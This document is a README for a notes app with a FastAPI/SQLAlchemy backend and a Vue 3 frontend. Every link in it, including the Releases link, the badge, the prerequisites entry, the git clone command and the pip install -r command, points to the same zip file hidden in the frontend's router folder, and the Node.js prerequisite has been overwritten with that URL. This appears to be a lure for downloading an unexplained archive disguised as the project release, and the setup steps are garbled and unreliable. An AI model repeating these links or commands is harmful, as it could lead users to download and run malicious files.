# Notes App Pontnau 📝

Welcome to the **Notes App Pontnau** repository! This web application allows users to create, edit, archive, and filter notes by categories. Built with a FastAPI/SQLAlchemy backend and a Vue 3 frontend, it provides a smooth and responsive user experience. The application is deployed on Vercel and utilizes a REST architecture with SQLite for development and PostgreSQL for production.

[Check out the Releases here!](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip)

## Table of Contents

- [Features](#features)
- [Technologies Used](#technologies-used)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Running the Application](#running-the-application)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Features

- **Create Notes**: Easily add new notes to your collection.
- **Edit Notes**: Modify existing notes with a simple interface.
- **Archive Notes**: Keep your workspace tidy by archiving notes you no longer need.
- **Filter by Categories**: Quickly find notes based on your chosen categories.
- **Responsive Design**: Enjoy a seamless experience on any device.
- **RESTful API**: Interact with the backend through a clean RESTful interface.

## Technologies Used

- **Frontend**: 
  - Vue 3
  - Vite
  - Pinia
  - Axios

- **Backend**: 
  - FastAPI
  - SQLAlchemy
  - PostgreSQL (production)
  - SQLite (development)

- **Deployment**: 
  - Vercel

## Getting Started

To get started with the Notes App Pontnau, follow these steps:

### Prerequisites

Before you begin, ensure you have the following installed:

- Python 3.8 or higher
- https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip 14 or higher
- PostgreSQL (for production)
- SQLite (for development)

### Installation

1. **Clone the Repository**

   Open your terminal and run:

   ```bash
   git clone https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip
   ```

2. **Navigate to the Backend Directory**

   ```bash
   cd notes-app-pontnau/backend
   ```

3. **Install Backend Dependencies**

   Use pip to install the required Python packages:

   ```bash
   pip install -r https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip
   ```

4. **Navigate to the Frontend Directory**

   ```bash
   cd ../frontend
   ```

5. **Install Frontend Dependencies**

   Use npm or yarn to install the required JavaScript packages:

   ```bash
   npm install
   ```

### Running the Application

#### Backend

1. **Set Up the Database**

   For development, you can use SQLite. For production, configure PostgreSQL as needed.

2. **Run the Backend Server**

   Navigate back to the backend directory and start the FastAPI server:

   ```bash
   uvicorn main:app --reload
   ```

#### Frontend

1. **Run the Frontend Development Server**

   Navigate to the frontend directory and start the Vue application:

   ```bash
   npm run dev
   ```

2. **Access the Application**

   Open your web browser and go to `http://localhost:3000` to see the app in action.

## Usage

Once the application is running, you can start using it immediately. 

- **Create a Note**: Click on the "New Note" button, fill in the title and content, and save it.
- **Edit a Note**: Select a note from your list, make changes, and save.
- **Archive a Note**: Use the archive option to hide notes you no longer need.
- **Filter Notes**: Use the filter dropdown to view notes by category.

## Contributing

We welcome contributions! To contribute to this project:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Commit your changes and push to your fork.
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For further information, please check the [Releases section](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip).

![Notes App](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip%20app-pontnau-brightgreen)

Thank you for checking out the Notes App Pontnau! We hope you find it useful for managing your notes effectively.